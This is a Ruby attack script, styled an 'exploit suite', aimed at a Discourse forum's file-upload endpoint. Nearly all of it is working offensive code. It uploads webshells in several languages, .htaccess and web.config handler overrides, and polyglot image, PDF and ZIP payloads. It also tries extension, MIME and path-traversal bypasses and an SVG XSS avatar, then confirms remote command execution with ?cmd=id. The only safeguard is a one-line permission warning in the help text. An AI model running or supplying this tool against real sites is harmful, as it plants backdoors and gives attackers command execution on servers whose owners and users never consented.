#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'nokogiri'
require 'base64'
require 'mime/types'
require 'securerandom'

class DiscourseFileUploadExploits
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 15
    @csrf_token = nil
    @session_cookies = nil
    
    get_csrf_token
  end
  
  def get_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        doc = Nokogiri::HTML(response.body)
        csrf_meta = doc.at_css('meta[name="csrf-token"]')
        @csrf_token = csrf_meta['content'] if csrf_meta
        
        # Store session cookies
        @session_cookies = response['Set-Cookie'] if response['Set-Cookie']
      end
    rescue => e
      puts "[!] Error getting CSRF token: #{e.message}"
    end
  end
  
  def test_malicious_file_upload
    puts "\n[*] Testing malicious file upload vulnerabilities..."
    results = { vulnerable: false, details: [], uploaded_files: [] }
    
    # Malicious file payloads
    malicious_files = [
      # PHP webshells
      {
        filename: 'shell.php',
        content: '<?php system($_GET["cmd"]); ?>',
        content_type: 'application/x-php'
      },
      {
        filename: 'webshell.php',
        content: '<?php eval($_POST["code"]); ?>',
        content_type: 'text/php'
      },
      {
        filename: 'backdoor.php',
        content: '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',
        content_type: 'application/php'
      },
      # Ruby webshells
      {
        filename: 'shell.rb',
        content: 'system(params[:cmd]) if params[:cmd]',
        content_type: 'application/x-ruby'
      },
      # Python webshells
      {
        filename: 'shell.py',
        content: 'import os; os.system(request.args.get("cmd", ""))',
        content_type: 'text/x-python'
      },
      # JavaScript webshells
      {
        filename: 'shell.js',
        content: 'require("child_process").exec(process.argv[2]);',
        content_type: 'application/javascript'
      },
      # JSP webshells
      {
        filename: 'shell.jsp',
        content: '<%@ page import="java.io.*" %><%String cmd = request.getParameter("cmd");if(cmd != null) {Process p = Runtime.getRuntime().exec(cmd);InputStream is = p.getInputStream();int i;while((i=is.read())!=-1) out.write(i);}%>',
        content_type: 'application/x-jsp'
      },
      # ASP webshells
      {
        filename: 'shell.asp',
        content: '<%eval request("cmd")%>',
        content_type: 'application/x-asp'
      },
      # ASPX webshells
      {
        filename: 'shell.aspx',
        content: '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%string cmd = Request["cmd"]; if(cmd != null) { Process.Start("cmd.exe","/c " + cmd); }%>',
        content_type: 'application/x-aspx'
      },
      # Configuration files
      {
        filename: '.htaccess',
        content: "AddType application/x-httpd-php .jpg\nOptions +ExecCGI",
        content_type: 'text/plain'
      },
      {
        filename: 'web.config',
        content: '<?xml version="1.0" encoding="UTF-8"?><configuration><system.webServer><handlers><add name="test" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" /></handlers></system.webServer></configuration>',
        content_type: 'text/xml'
      }
    ]
    
    malicious_files.each do |file_data|
      begin
        get_csrf_token unless @csrf_token
        
        response = upload_file(
          file_data[:filename],
          file_data[:content],
          file_data[:content_type],
          'composer'
        )
        
        if check_malicious_upload(response, file_data[:filename])
          results[:vulnerable] = true
          results[:details] << "Malicious file uploaded: #{file_data[:filename]}"
          results[:uploaded_files] << file_data[:filename]
          
          # Try to access the uploaded file
          test_uploaded_file_access(file_data[:filename], results)
        end
        
        sleep(0.5)
        
      rescue => e
        results[:details] << "Error uploading #{file_data[:filename]}: #{e.message}"
      end
    end
    
    results
  end
  
  def test_extension_bypass
    puts "\n[*] Testing file extension bypass techniques..."
    results = { vulnerable: false, details: [], bypassed_extensions: [] }
    
    php_shell = '<?php system($_GET["cmd"]); ?>'
    
    # Extension bypass techniques
    bypass_techniques = [
      # Double extensions
      'shell.php.jpg',
      'shell.php.png',
      'shell.php.gif',
      'shell.jpg.php',
      'shell.png.php',
      
      # Null byte injection
      "shell.php\x00.jpg",
      'shell.php%00.png',
      "shell.php\x00.gif",
      
      # Case manipulation
      'shell.PHP',
      'shell.Php',
      'shell.pHP',
      'shell.PhP',
      
      # Alternative extensions
      'shell.php3',
      'shell.php4',
      'shell.php5',
      'shell.phtml',
      'shell.phps',
      'shell.pht',
      'shell.phpt',
      
      # Special characters
      'shell.php.',
      'shell.php ',
      'shell.php::$DATA',
      'shell.php:test',
      
      # Unicode bypass
      "shell.ph\u0070",
      "shell.\u0070hp",
      
      # MIME type confusion
      'shell.jpg',  # with PHP content
      'shell.png',  # with PHP content
      'shell.gif'   # with PHP content
    ]
    
    bypass_techniques.each do |filename|
      begin
        get_csrf_token unless @csrf_token
        
        # Determine content type based on extension
        content_type = case filename
                      when /\.(jpg|jpeg)$/i
                        'image/jpeg'
                      when /\.png$/i
                        'image/png'
                      when /\.gif$/i
                        'image/gif'
                      else
                        'application/octet-stream'
                      end
        
        response = upload_file(filename, php_shell, content_type, 'composer')
        
        if check_extension_bypass(response, filename)
          results[:vulnerable] = true
          results[:details] << "Extension bypass successful: #{filename}"
          results[:bypassed_extensions] << filename
        end
        
        sleep(0.5)
        
      rescue => e
        results[:details] << "Error testing extension bypass #{filename}: #{e.message}"
      end
    end
    
    results
  end
  
  def test_mime_type_bypass
    puts "\n[*] Testing MIME type bypass techniques..."
    results = { vulnerable: false, details: [], bypassed_mimes: [] }
    
    php_shell = '<?php system($_GET["cmd"]); ?>'
    
    # MIME type bypass techniques
    mime_bypasses = [
      # Image MIME types with PHP content
      ['shell.php', 'image/jpeg'],
      ['shell.php', 'image/png'],
      ['shell.php', 'image/gif'],
      ['shell.php', 'image/bmp'],
      ['shell.php', 'image/webp'],
      
      # Text MIME types
      ['shell.php', 'text/plain'],
      ['shell.php', 'text/html'],
      ['shell.php', 'text/css'],
      ['shell.php', 'text/javascript'],
      
      # Application MIME types
      ['shell.php', 'application/octet-stream'],
      ['shell.php', 'application/json'],
      ['shell.php', 'application/xml'],
      ['shell.php', 'application/pdf'],
      
      # Malformed MIME types
      ["shell.php", "image/jpeg\r\n"],
      ["shell.php", "image/jpeg\x00"],
      ['shell.php', 'image/jpeg; charset=utf-8'],
      ['shell.php', 'IMAGE/JPEG'],
      ['shell.php', 'image/JPEG']
    ]
    
    mime_bypasses.each do |filename, mime_type|
      begin
        get_csrf_token unless @csrf_token
        
        response = upload_file(filename, php_shell, mime_type, 'composer')
        
        if check_mime_bypass(response, filename, mime_type)
          results[:vulnerable] = true
          results[:details] << "MIME bypass successful: #{filename} (#{mime_type})"
          results[:bypassed_mimes] << "#{filename} (#{mime_type})"
        end
        
        sleep(0.5)
        
      rescue => e
        results[:details] << "Error testing MIME bypass #{filename}: #{e.message}"
      end
    end
    
    results
  end
  
  def test_polyglot_files
    puts "\n[*] Testing polyglot file uploads..."
    results = { vulnerable: false, details: [], polyglot_files: [] }
    
    # Polyglot file payloads
    polyglot_files = [
      # GIF + PHP polyglot
      {
        filename: 'polyglot.gif',
        content: 'GIF89a<?php system($_GET["cmd"]); ?>',
        content_type: 'image/gif'
      },
      # JPEG + PHP polyglot
      {
        filename: 'polyglot.jpg',
        content: "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01<?php system(\$_GET[\"cmd\"]); ?>",
        content_type: 'image/jpeg'
      },
      # PNG + PHP polyglot
      {
        filename: 'polyglot.png',
        content: "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde<?php system(\$_GET[\"cmd\"]); ?>",
        content_type: 'image/png'
      },
      # PDF + PHP polyglot
      {
        filename: 'polyglot.pdf',
        content: "%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj 2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj 3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Parent 2 0 R>>endobj\nxref\n0 4\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\ntrailer<</Size 4/Root 1 0 R>>\nstartxref\n174\n%%EOF\n<?php system(\$_GET[\"cmd\"]); ?>",
        content_type: 'application/pdf'
      },
      # ZIP + PHP polyglot
      {
        filename: 'polyglot.zip',
        content: "PK\x03\x04\x14\x00\x00\x00\x08\x00<?php system(\$_GET[\"cmd\"]); ?>",
        content_type: 'application/zip'
      }
    ]
    
    polyglot_files.each do |file_data|
      begin
        get_csrf_token unless @csrf_token
        
        response = upload_file(
          file_data[:filename],
          file_data[:content],
          file_data[:content_type],
          'composer'
        )
        
        if check_polyglot_upload(response, file_data[:filename])
          results[:vulnerable] = true
          results[:details] << "Polyglot file uploaded: #{file_data[:filename]}"
          results[:polyglot_files] << file_data[:filename]
        end
        
        sleep(0.5)
        
      rescue => e
        results[:details] << "Error uploading polyglot #{file_data[:filename]}: #{e.message}"
      end
    end
    
    results
  end
  
  def test_path_traversal_upload
    puts "\n[*] Testing path traversal in file uploads..."
    results = { vulnerable: false, details: [], traversal_paths: [] }
    
    php_shell = '<?php system($_GET["cmd"]); ?>'
    
    # Path traversal payloads
    traversal_paths = [
      '../shell.php',
      '../../shell.php',
      '../../../shell.php',
      '..\\shell.php',
      '..\\..\\shell.php',
      '....//shell.php',
      '....\\\\shell.php',
      '%2e%2e%2fshell.php',
      '%2e%2e%5cshell.php',
      '..%2fshell.php',
      '..%5cshell.php',
      '%252e%252e%252fshell.php',
      '..%252fshell.php',
      '..%c0%afshell.php',
      '..%c1%9cshell.php',
      '/var/www/html/shell.php',
      '/tmp/shell.php',
      '/etc/passwd',
      'C:\\Windows\\System32\\shell.php'
    ]
    
    traversal_paths.each do |path|
      begin
        get_csrf_token unless @csrf_token
        
        response = upload_file(path, php_shell, 'application/x-php', 'composer')
        
        if check_path_traversal(response, path)
          results[:vulnerable] = true
          results[:details] << "Path traversal successful: #{path}"
          results[:traversal_paths] << path
        end
        
        sleep(0.5)
        
      rescue => e
        results[:details] << "Error testing path traversal #{path}: #{e.message}"
      end
    end
    
    results
  end
  
  def test_avatar_upload_bypass
    puts "\n[*] Testing avatar upload bypass vulnerabilities..."
    results = { vulnerable: false, details: [], avatar_bypasses: [] }
    
    # Avatar upload bypass payloads
    avatar_payloads = [
      {
        filename: 'avatar.php.jpg',
        content: '<?php system($_GET["cmd"]); ?>',
        content_type: 'image/jpeg'
      },
      {
        filename: 'avatar.gif',
        content: 'GIF89a<?php system($_GET["cmd"]); ?>',
        content_type: 'image/gif'
      },
      {
        filename: 'avatar.svg',
        content: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>',
        content_type: 'image/svg+xml'
      }
    ]
    
    avatar_payloads.each do |payload|
      begin
        get_csrf_token unless @csrf_token
        
        response = upload_file(
          payload[:filename],
          payload[:content],
          payload[:content_type],
          'avatar'
        )
        
        if check_avatar_bypass(response, payload[:filename])
          results[:vulnerable] = true
          results[:details] << "Avatar upload bypass: #{payload[:filename]}"
          results[:avatar_bypasses] << payload[:filename]
        end
        
        sleep(0.5)
        
      rescue => e
        results[:details] << "Error testing avatar bypass #{payload[:filename]}: #{e.message}"
      end
    end
    
    results
  end
  
  def upload_file(filename, content, content_type, upload_type = 'composer')
    uri = URI("#{@target_url}/uploads.json")
    
    boundary = "----WebKitFormBoundary#{SecureRandom.hex(16)}"
    
    # Build multipart form data
    body = ""
    body << "--#{boundary}\r\n"
    body << "Content-Disposition: form-data; name=\"file\"; filename=\"#{filename}\"\r\n"
    body << "Content-Type: #{content_type}\r\n\r\n"
    body << content
    body << "\r\n"
    
    body << "--#{boundary}\r\n"
    body << "Content-Disposition: form-data; name=\"type\"\r\n\r\n"
    body << upload_type
    body << "\r\n"
    
    body << "--#{boundary}\r\n"
    body << "Content-Disposition: form-data; name=\"synchronous\"\r\n\r\n"
    body << "true"
    body << "\r\n"
    
    body << "--#{boundary}--\r\n"
    
    headers = {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}",
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    }
    
    make_request(uri, 'POST', body, headers)
  end
  
  def test_uploaded_file_access(filename, results)
    # Common upload paths in Discourse
    upload_paths = [
      "/uploads/default/original/#{filename}",
      "/uploads/#{filename}",
      "/public/uploads/#{filename}",
      "/assets/uploads/#{filename}",
      "/#{filename}"
    ]
    
    upload_paths.each do |path|
      begin
        test_url = "#{@target_url}#{path}"
        
        # Test direct access
        response = make_request(URI(test_url), 'GET')
        
        if response && response.code.to_i == 200
          results[:details] << "Uploaded file accessible at: #{test_url}"
          
          # Test code execution (for PHP files)
          if filename.end_with?('.php')
            exec_url = "#{test_url}?cmd=id"
            exec_response = make_request(URI(exec_url), 'GET')
            
            if exec_response && (exec_response.body.include?('uid=') || exec_response.body.include?('gid='))
              results[:details] << "CODE EXECUTION CONFIRMED: #{exec_url}"
            end
          end
          
          break
        end
        
      rescue => e
        results[:details] << "Error testing file access: #{e.message}"
      end
    end
  end
  
  def check_malicious_upload(response, filename)
    return false unless response && [200, 201].include?(response.code.to_i)
    
    content = response.body.downcase
    
    # Check for upload success indicators
    success_indicators = [
      'upload', 'success', 'url', 'id', 'original_filename',
      filename.downcase, 'created'
    ]
    
    success_indicators.any? { |indicator| content.include?(indicator) }
  end
  
  def check_extension_bypass(response, filename)
    check_malicious_upload(response, filename)
  end
  
  def check_mime_bypass(response, filename, mime_type)
    check_malicious_upload(response, filename)
  end
  
  def check_polyglot_upload(response, filename)
    check_malicious_upload(response, filename)
  end
  
  def check_path_traversal(response, path)
    check_malicious_upload(response, path)
  end
  
  def check_avatar_bypass(response, filename)
    check_malicious_upload(response, filename)
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'application/json, text/javascript, */*; q=0.01',
      'Accept-Language' => 'en-US,en;q=0.9',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    default_headers['Cookie'] = @session_cookies if @session_cookies
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      http.request(request)
    rescue => e
      puts "[!] Request failed: #{e.message}"
      nil
    end
  end
  
  def run_all_tests
    puts "\n🔍 Starting file upload vulnerability tests on #{@target_url}"
    puts "=" * 60
    
    all_results = {
      target: @target_url,
      timestamp: Time.now.strftime('%Y-%m-%d %H:%M:%S'),
      tests: {}
    }
    
    tests = [
      ['Malicious File Upload', method(:test_malicious_file_upload)],
      ['Extension Bypass', method(:test_extension_bypass)],
      ['MIME Type Bypass', method(:test_mime_type_bypass)],
      ['Polyglot Files', method(:test_polyglot_files)],
      ['Path Traversal Upload', method(:test_path_traversal_upload)],
      ['Avatar Upload Bypass', method(:test_avatar_upload_bypass)]
    ]
    
    tests.each do |test_name, test_method|
      puts "\n[*] Running #{test_name}..."
      begin
        result = test_method.call
        all_results[:tests][test_name] = result
        
        if result[:vulnerable]
          puts "[!] VULNERABLE: #{test_name}"
          result[:details].each { |detail| puts "    - #{detail}" }
        else
          puts "[+] Not vulnerable: #{test_name}"
        end
        
      rescue => e
        puts "[!] Error in #{test_name}: #{e.message}"
        all_results[:tests][test_name] = { error: e.message }
      end
    end
    
    print_results(all_results)
    save_results(all_results)
    
    all_results
  end
  
  def print_results(results)
    puts "\n" + "=" * 60
    puts "FILE UPLOAD TEST SUMMARY"
    puts "=" * 60
    
    vulnerable_tests = []
    results[:tests].each do |test_name, result|
      vulnerable_tests << test_name if result[:vulnerable]
    end
    
    if vulnerable_tests.any?
      puts "[!] CRITICAL: #{vulnerable_tests.length} file upload vulnerabilities found!"
      vulnerable_tests.each { |test| puts "    - #{test}" }
      puts "\n[!] WARNING: File upload vulnerabilities can lead to RCE and server compromise!"
    else
      puts "[+] No file upload vulnerabilities detected"
    end
    
    puts "\n[*] Full results saved to discourse_file_upload_results.json"
  end
  
  def save_results(results)
    File.write('discourse_file_upload_results.json', JSON.pretty_generate(results))
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse File Upload Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_file_upload_exploits.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 15)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_file_upload_exploits.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseFileUploadExploits.new(target_url, options)
    results = exploit.run_all_tests
    
    vulnerable_tests = results[:tests].select { |_, result| result[:vulnerable] }
    
    if vulnerable_tests.any?
      puts "\n🚨 CRITICAL: File upload vulnerabilities found!"
      puts "   Remote code execution possible!"
    else
      puts "\n✅ No file upload vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end